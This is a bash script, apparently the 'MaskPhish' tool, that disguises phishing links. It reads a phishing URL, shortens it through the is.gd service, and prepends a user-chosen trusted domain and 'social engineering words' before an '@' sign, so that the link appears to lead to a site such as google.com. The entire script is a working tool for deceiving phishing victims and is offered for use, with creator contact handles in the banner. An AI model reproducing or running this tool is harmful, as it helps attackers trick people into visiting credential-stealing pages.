url_checker() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
            echo -e "\e[31m[!] Invalid URL. Please use http or https.\e[0m"
            exit 1
        fi
    fi
}

echo -e "

"
echo -e "\u001b[36;1m***********************************"
echo -e "
   \u001b[32;1m██╗  ██╗██╗██████╗ ███████╗
   \u001b[32;1m██║  ██║██║██╔══██╗██╔════╝
   \u001b[33;1m███████║██║██║  ██║█████╗  
   \u001b[34;1m██╔══██║██║██║  ██║██╔══╝  
   \u001b[35;1m██║  ██║██║██████╔╝███████╗
   \u001b[36;1m╚═╝  ╚═╝╚═╝╚═════╝ ╚══════╝
                              "
echo -e "\u001b[36;1m***********************************"
echo -e "\u001b[33;1mCREATOR      :   ARMAN KHAN"
echo -e "\u001b[32;1mFACEBOOK     :   Arman Khan"
echo -e "\u001b[31;1mTELEGRAM     :   ArMaNkHan00000"
echo -e "\u001b[35;1m-----------------------------------
 
 "
echo -e "                   \u001b[36;1m### Phishing URL ###\n"
 echo -n "Paste Phishing URL here (with http or https): "
read phish
url_checker $phish
sleep 1
echo "
Processing and Modifing Phishing URL...."
echo ""
short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${phish})
shorter=${short#https://}
echo -e "\n                    \u001b[33;1m### Masking Domain ###\n"
echo 'Please Enter Domain to mask the Phishing URL (with http or https), ex: https://google.com, http
://anything.org) :'
echo -en "
\e[32m=>\e[0m "
read mask
url_checker $mask
echo -e '\nType social engineering words:(like free-money, Free-fire-free-Diamond,anything)'
echo -e "
\e[31mDon't use space just use '-'._ between social engineering words\e[0m"
echo -en "
\e[32m=>\e[0m "
read words
if [[ -z "$words" ]]; then
echo -e "\e[31m[!] No words.\e[0m"
echo -e "\nGenerating MaskPhish Link...\n"
final=$mask@$shorter
echo -e "Here is the MaskPhish URL:\e[32m ${final} \e[0m\n"
exit
fi
if [[ "$words" =~ " " ]]; then
echo -e "\e[31m[!] Invalid words. Please avoid space.\e[0m"
echo -e "\nGenerating MaskPhish Link...\n"
final=$mask@$shorter
echo -e "Here is the MaskPhish URL:\e[32m ${final} \e[0m\n"
exit
fi
echo -e "\nGenerating MaskPhish Link...\n"
final=$mask-$words@$shorter
echo -e "Here is the MaskPhish URL:\e[32m ${final} \e[0m\n"